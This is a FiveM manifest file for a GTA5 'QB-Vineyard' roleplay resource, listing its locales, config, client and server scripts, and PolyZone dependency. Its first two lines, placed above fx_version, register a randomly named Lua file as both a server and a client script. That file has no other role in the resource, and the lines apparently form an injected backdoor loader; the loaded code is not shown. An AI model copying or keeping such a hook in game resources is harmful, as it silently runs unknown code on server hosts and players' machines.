server_script "DXSGF7RTGZ9UD1.lua"
client_script "DXSGF7RTGZ9UD1.lua"
fx_version 'cerulean'
game 'gta5'

description 'QB-Vineyard'
version '1.1.0'

shared_scripts {
    '@qb-core/shared/locale.lua',
    'locales/en.lua',
    'locales/*.lua',
    'config.lua'
}

server_script 'server.lua'
client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    'client.lua'
}

dependencies {
    'qb-core',
    'PolyZone'
}

lua54 'yes'